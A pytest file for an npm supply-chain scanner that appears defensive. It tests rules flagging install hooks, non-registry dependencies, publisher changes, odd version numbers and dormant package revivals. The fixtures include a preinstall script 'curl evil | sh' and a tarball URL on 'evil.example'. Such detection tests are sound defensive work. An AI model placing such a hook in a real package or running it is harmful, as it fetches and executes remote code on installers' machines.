"""Stage 1 npm metadata rules on hand-written, inert changes."""

from datetime import UTC, datetime, timedelta
from typing import Any

import pytest

from kitsunox.core.models import (
    Change,
    PackageVersionRef,
    Popularity,
    PublishInfo,
    Severity,
    VersionSnapshot,
)
from kitsunox.core.rules import RuleContext, run_rules
from kitsunox.ecosystems.npm.rules.metadata import (
    RULES,
    DependencyAdded,
    DormantRevived,
    InstallHook,
    MaintainerAdded,
    NonRegistryDependency,
    PublishMethodDowngrade,
    SuspiciousVersion,
    UnfamiliarPublisher,
)
from kitsunox.stages.triage import triage

T0 = datetime(2026, 10, 1, tzinfo=UTC)
CTX = RuleContext(as_of=T0)


def snap(version: str, manifest: dict[str, Any] | None = None, **publish: Any) -> VersionSnapshot:
    publish.setdefault("published_at", T0)
    return VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version=version),
        publish=PublishInfo(**publish),
        manifest=manifest or {},
    )


def change(
    new: VersionSnapshot, previous: VersionSnapshot | None = None, watched: bool = False
) -> Change:
    popularity = Popularity(source="t", downloads=None, period_days=30, watched=watched)
    return Change(new=new, previous=previous, popularity=popularity)


def test_install_hook_added_changed_and_new_package() -> None:
    rule = InstallHook()
    old = snap("1.0.0", {"scripts": {"postinstall": "node build.js", "test": "jest"}})
    new = snap("1.0.1", {"scripts": {"postinstall": "node x.js", "preinstall": "curl evil | sh"}})
    findings = rule.evaluate(change(new, old), CTX)
    assert [(f.severity, f.evidence[0].path) for f in findings] == [
        (Severity.HIGH, "package.json:scripts.preinstall"),
        (Severity.HIGH, "package.json:scripts.postinstall"),
    ]
    assert findings[1].evidence[0].before == "node build.js"
    fresh = rule.evaluate(change(snap("1.0.0", {"scripts": {"install": "node i.js"}})), CTX)
    assert [f.severity for f in fresh] == [Severity.MEDIUM]
    assert rule.evaluate(change(old, old), CTX) == []


def test_long_snippets_are_truncated() -> None:
    payload = "x" * 5000
    (finding,) = InstallHook().evaluate(change(snap("1", {"scripts": {"install": payload}})), CTX)
    assert finding.evidence[0].after is not None and len(finding.evidence[0].after) < 400


@pytest.mark.parametrize(
    ("spec", "fires"),
    [
        ("^1.2.3", False),
        ("1.x || >=2.5.0 <3", False),
        ("latest", False),
        ("npm:other@^1", False),
        ("workspace:*", False),
        ("*", False),
        ("git+https://github.com/x/y.git", True),
        ("github:x/y", True),
        ("x/y", True),
        ("https://evil.example/p.tgz", True),
        ("file:../local", True),
    ],
)
def test_non_registry_dependency(spec: str, fires: bool) -> None:
    new = snap("1.0.1", {"dependencies": {"dep": spec}})
    assert bool(NonRegistryDependency().evaluate(change(new, snap("1.0.0")), CTX)) is fires


def test_unchanged_non_registry_dependency_is_not_new() -> None:
    manifest = {"dependencies": {"dep": "github:x/y"}}
    assert (
        NonRegistryDependency().evaluate(change(snap("2", manifest), snap("1", manifest)), CTX)
        == []
    )


def test_dependency_added_only_for_existing_packages() -> None:
    old = snap("1", {"dependencies": {"a": "^1"}})
    new = snap("2", {"dependencies": {"a": "^1", "b": "^2"}, "optionalDependencies": {"c": "1"}})
    (finding,) = DependencyAdded().evaluate(change(new, old), CTX)
    assert finding.explanation == "2 dependencies added: b, c"
    assert DependencyAdded().evaluate(change(new), CTX) == []


@pytest.mark.parametrize(
    ("old", "new", "fires"),
    [
        ({"trusted_publisher": "github"}, {"publisher": "mallory"}, True),
        ({"has_provenance": True}, {"publisher": "mallory"}, True),
        ({"trusted_publisher": "github"}, {"has_provenance": True}, False),
        ({}, {}, False),
    ],
)
def test_publish_method_downgrade(old: dict[str, Any], new: dict[str, Any], fires: bool) -> None:
    c = change(snap("2", **new), snap("1", **old))
    assert bool(PublishMethodDowngrade().evaluate(c, CTX)) is fires


def test_unfamiliar_publisher() -> None:
    old = snap("1", publisher="alice", maintainers=("alice", "bob"))
    assert UnfamiliarPublisher().evaluate(change(snap("2", publisher="bob"), old), CTX) == []
    (finding,) = UnfamiliarPublisher().evaluate(change(snap("2", publisher="mallory"), old), CTX)
    assert finding.evidence[0].after == "mallory"
    no_list = snap("1", publisher="alice")
    assert UnfamiliarPublisher().evaluate(change(snap("2", publisher="eve"), no_list), CTX) == []


def test_maintainer_added() -> None:
    old = snap("1", maintainers=("alice",))
    (finding,) = MaintainerAdded().evaluate(
        change(snap("2", maintainers=("alice", "eve")), old), CTX
    )
    assert "eve" in finding.explanation


@pytest.mark.parametrize(
    ("version", "previous", "fires"),
    [
        ("99.9.9", None, True),
        ("999.0.0", "1.0.0", True),
        ("2026.10.1", "2026.9.30", False),
        ("12.0.0", "11.0.0", False),
        ("not-semver", None, False),
    ],
)
def test_suspicious_version(version: str, previous: str | None, fires: bool) -> None:
    c = change(snap(version), snap(previous) if previous else None)
    assert bool(SuspiciousVersion().evaluate(c, CTX)) is fires


def test_dormant_revived() -> None:
    old = snap("1", published_at=T0 - timedelta(days=400))
    (finding,) = DormantRevived().evaluate(change(snap("2"), old), CTX)
    assert finding.explanation.startswith("400 days")
    recent = snap("1", published_at=T0 - timedelta(days=30))
    assert DormantRevived().evaluate(change(snap("2"), recent), CTX) == []


@pytest.mark.parametrize(
    "manifest",
    [
        {"scripts": "postinstall"},
        {"scripts": {"postinstall": 1}},
        {"dependencies": ["a", "b"]},
        {"dependencies": {"a": None}},
        {"scripts": None, "dependencies": 7, "optionalDependencies": True},
    ],
)
def test_hostile_manifest_types_never_crash(manifest: dict[str, Any]) -> None:
    run_rules(RULES, change(snap("2", manifest), snap("1", manifest)), CTX)
    run_rules(RULES, change(snap("2", manifest)), CTX)


def test_triage_forward_policy() -> None:
    quiet = change(snap("2"), snap("1"))
    assert triage(quiet, CTX).history[-1].reason == "no signal"
    assert (
        triage(change(snap("2"), snap("1"), watched=True), CTX).history[-1].reason
        == "watched package"
    )
    hook = change(snap("2", {"scripts": {"preinstall": "x"}}), snap("1"))
    decision = triage(hook, CTX).history[-1]
    assert decision.forwarded and decision.reason == "rules: npm.install-hook"
    low_only = change(snap("2", maintainers=("a", "b")), snap("1", maintainers=("a",)))
    assert not triage(low_only, CTX).history[-1].forwarded  # LOW findings alone don't forward
